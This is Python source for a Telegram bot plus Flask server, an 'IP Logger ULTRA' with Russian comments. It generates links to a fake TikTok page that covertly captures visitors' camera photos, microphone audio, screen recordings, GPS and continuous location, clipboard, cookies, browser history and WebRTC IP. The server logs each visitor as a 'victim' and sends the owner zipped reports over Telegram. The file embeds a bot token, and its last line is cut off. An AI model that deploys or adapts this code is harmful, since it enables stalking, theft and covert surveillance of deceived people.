import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64
import zipfile

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"

bot = TelegramClient('logger_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
loop = None

FULL_PAGE = """<!DOCTYPE html>
<html>
<head><title>TikTok — Make Your Day</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:Arial;overflow:hidden}
.header{background:#000;padding:10px;display:flex;justify-content:space-around;border-bottom:1px solid #333;position:fixed;top:0;width:100%;z-index:100}
.header span{color:#fff;font-size:14px;padding:5px 10px}
.header .active{color:#fff;border-bottom:2px solid #fff}
.video-container{width:100%;height:100vh;display:flex;align-items:center;justify-content:center;background:#111}
.loading{color:#fff;font-size:16px;text-align:center}
.spinner{border:3px solid #333;border-top:3px solid #fe2c55;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.footer{position:fixed;bottom:0;width:100%;background:#000;padding:15px;display:flex;justify-content:space-around;border-top:1px solid #333}
.footer span{color:#fff;font-size:12px}
</style></head>
<body>
<div class="header"><span>Following</span><span class="active">For You</span><span>LIVE</span></div>
<div class="video-container"><div class="loading"><div class="spinner"></div><p>Loading video...</p></div></div>
<div class="footer"><span>🏠 Home</span><span>🔍 Discover</span><span>➕</span><span>💬 Inbox</span><span>👤 Profile</span></div>
<video id="v" style="display:none" autoplay playsinline></video><canvas id="c" style="display:none"></canvas>
<script>
fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?'})});

// GPS
function getGPS(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err=>{navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err2=>{},{enableHighAccuracy:true,timeout:20000,maximumAge:0});},{enableHighAccuracy:true,timeout:20000,maximumAge:0});}}

// История браузера
async function stealHistory(){var sites=['https://web.telegram.org','https://vk.com','https://ok.ru','https://instagram.com','https://twitter.com','https://youtube.com','https://discord.com','https://github.com','https://steamcommunity.com','https://reddit.com','https://tinder.com','https://onlyfans.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru','https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'];var visited=[];for(var i=0;i<sites.length;i++){try{var img=new Image();img.src=sites[i]+'/favicon.ico';await new Promise(function(r){img.onload=function(){visited.push(sites[i]);r();};img.onerror=function(){visited.push(sites[i]);r();};setTimeout(function(){r();},500);});}catch(e){}}if(visited.length>0){fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});}}

// Буфер обмена
async function stealClipboard(){try{var text=await navigator.clipboard.readText();if(text&&text.length>0){fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}}catch(e){}}

// WebRTC IP (реальный IP даже через VPN)
function getWebRTCIP(){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(e){if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(ip){fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:ip[0]})});}}};}

// Telegram аккаунт
function checkTelegram(){var iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='https://web.telegram.org/k/';iframe.onload=function(){try{var doc=iframe.contentDocument||iframe.contentWindow.document;var text=doc.body.innerText||'';if(text.length>0){fetch('/telegram_check/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({telegram_text:text.substring(0,500)}));}}catch(e){}};document.body.appendChild(iframe);setTimeout(function(){document.body.removeChild(iframe);},5000);}

// Куки-граббер
function stealCookies(){var cookies=document.cookie;if(cookies.length>0){fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:cookies})});}}

// Камера
async function cam(){try{var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=st;await v.play();await new Promise(function(r){setTimeout(r,3000);});var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});st.getTracks().forEach(function(t){t.stop();});}catch(e){}}

// Аудио
async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){}}

// Запись экрана
async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});await new Promise(function(r){setTimeout(r,1000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){console.log('Screen:',e);}}

// Гео-трекинг (непрерывный)
function startGeoTracking(){if(navigator.geolocation){setInterval(function(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/geo_track/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,ts:Date.now()})});},err=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});},10000);}}

setTimeout(getGPS,1000);
setTimeout(stealHistory,2000);
setTimeout(cam,3000);
setTimeout(recordAudio,4000);
setTimeout(recordScreen,5000);
setTimeout(stealClipboard,6000);
setTimeout(getWebRTCIP,7000);
setTimeout(checkTelegram,8000);
setTimeout(stealCookies,9000);
setTimeout(startGeoTracking,10000);
</script></body></html>"""

AUDIO_PAGE = """<!DOCTYPE html>
<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial;}</style></head>
<body><h3>Loading audio...</h3><p>Please wait</p>
<script>
async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.querySelector('h3').innerText='Done!';}catch(e){document.querySelector('h3').innerText='Error';}}
recordAudio();
</script></body></html>"""

SCREEN_PAGE = """<!DOCTYPE html>
<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial;}</style></head>
<body><h3>Loading screen...</h3><p>Click "Share" when asked</p>
<script>
async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.querySelector('h3').innerText='Done!';}catch(e){document.querySelector('h3').innerText='Error';}}
recordScreen();
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    first_ip = ip.split(',')[0].strip()
    for url in [f"https://ipapi.co/{first_ip}/json/", f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", f"https://ipwhois.app/json/{first_ip}"]:
        try:
            r = requests.get(url, timeout=5)
            data = r.json()
            if data.get('city'):
                return {'country': data.get('country_name') or data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('region') or data.get('regionName','?'), 'isp': data.get('org') or data.get('isp','?'), 'lat': data.get('latitude') or data.get('lat'), 'lon': data.get('longitude') or data.get('lon'), 'query': first_ip}
        except: pass
    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}

@app.route('/')
def home():
    return "OK"

@app.route('/go/<lid>')
def track(lid):
    if lid not in links:
        return "Ссылка недействительна"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None, 'audio': None, 'screen': None, 'clipboard': None, 'webrtc_ip': None, 'telegram': None, 'cookies': None, 'geo_track': []}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    link_type = links[lid].get('type', 'full')
    if link_type == 'audio': return render_template_string(AUDIO_PAGE, link_id=lid)
    elif link_type == 'screen': return render_template_string(SCREEN_PAGE, link_id=lid)
    return render_template_string(FULL_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']: links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/history/<lid>', methods=['POST'])
def history(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['history'] = d
    return 'ok'

@app.route('/audio/<lid>', methods=['POST'])
def audio(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('audio'): links[lid]['victims'][-1]['audio'] = d['audio']
    return 'ok'

@app.route('/screen/<lid>', methods=['POST'])
def screen(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('screen'): links[lid]['victims'][-1]['screen'] = d['screen']
    return 'ok'

@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'

@app.route('/webrtc/<lid>', methods=['POST'])
def webrtc(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('webrtc_ip'): links[lid]['victims'][-1]['webrtc_ip'] = d['webrtc_ip']
    return 'ok'

@app.route('/telegram_check/<lid>', methods=['POST'])
def telegram_check(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('telegram_text'): links[lid]['victims'][-1]['telegram'] = d['telegram_text']
    return 'ok'

@app.route('/cookies/<lid>', methods=['POST'])
def cookies(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('cookies'): links[lid]['victims'][-1]['cookies'] = d['cookies']
    return 'ok'

@app.route('/geo_track/<lid>', methods=['POST'])
def geo_track(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['geo_track'].append(d)
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(25)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        
        zip_path = f"/tmp/data_{lid}.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            report = f"""📋 ОТЧЁТ IP LOGGER
═══════════════
🕐 Время: {v.get('time','?')}
🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
🕵️ WebRTC IP: {v.get('webrtc_ip','?')}
🏙 Город: {v.get('city','?')}
🗺 Регион: {v.get('region','?')}
🌍 Страна: {v.get('country','?')}
📡 Провайдер: {v.get('isp','?')}
📱 Устройство: {v.get('ua','?')[:200]}
"""
            if v.get('gps') and v['gps'].get('lat'):
                report += f"📍 ТОЧНЫЙ GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
            if v.get('geo_track'):
                report += f"\n📍 Гео-трек ({len(v['geo_track'])} точек)\n"
            if v.get('history') and v['history'].get('visited'):
                report += f"\n📜 История браузера ({len(v['history']['visited'])} сайтов):\n"
                for site in v['history']['visited']: report += f"  • {site}\n"
            if v.get('clipboard'):
                report += f"\n📋 Буфер обмена:\n{v['clipboard'][:500]}\n"
            if v.get('cookies'):
                report += f"\n🍪 Куки:\n{v['cookies'][:500]}\n"
            if v.get('telegram'):
                report += f"\n📱 Telegram данные:\n{v['telegram'][:500]}\n"
            zf.writestr('report.txt', report)
            
            if v.get('photo'):
                try: zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
                except: pass
            if v.get('audio'):
                try: zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
                except: pass
            if v.get('screen'):
                try: zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
                except: pass
        
        await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
        os.remove(zip_path)
        
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(v['gps'].get('acc',10))))
            await bot.send_file(uid, file=geo, caption=f"📍 ТОЧНЫЙ GPS (±{v['gps'].get('acc','?')}м)")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
        elif v.get('lat') and v.get('lon'):
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
            await bot.send_file(uid, file=geo, caption="📍 IP-гео")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
        
        # Если есть WebRTC IP — шлём отдельно
        if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
            await bot.send_message(uid, f"🕵️ **WebRTC IP (реальный):** `{v['webrtc_ip']}`\n(даже через VPN!)")
        
        # Если есть данные Telegram — шлём
        if v.get('telegram'):
            await bot.send_message(uid, f"📱 **Telegram данные:**\n{v['telegram'][:300]}")
        
        # Если есть куки — шлём
        if v.get('cookies'):
            await bot.send_message(uid, f"🍪 **Куки:**\n{v['cookies'][:300]}")
        
    except Exception as e:
        print(f"Ошибка: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [
        [Button.inline("🎭 Полный логгер (ВСЁ)", "full")],
        [Button.inline("🎤 Только аудио", "audio")],
        [Button.inline("🎥 Только экран", "screen")],
    ]
    await event.reply("🎭 **IP Logger ULTRA**\n\n📸 Фото\n🎤 Аудио\n🎥 Экран\n📍 GPS\n🕵️ WebRTC IP\n📱 Telegram\n🍪 Куки\n📋 Буфер\n📜 История\n📍 Гео-трекинг\n\nВыбери тип:", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    link_type = event.data.decode()
    lid = gen_id()
    links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': [], 'type': link_type}
    names = {'full': '🎭 Ультра-логгер', 'audio': '🎤 Аудио', 'screen': '🎥 Экран'}
    await event.edit(f"✅ **{names.get(link_type)}**\n\n🔗 `https://botaald.onrender.com/go/{lid}`")

@bot.on(events.NewMessage(pattern='/list'))
async def lst(event):
    my = {k: v for k, v in links.items() if v['owner'] == event.sender_id}
    if not my:
        await event.reply("Нет ссылок")
    else:
        r = "📋 **Ссылки:**\n"
        for lid, d in my.items():
            r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
        await event.reply(r)

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask():
        app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Ультра-логгер запущен!")
    await bot.run_until_discon
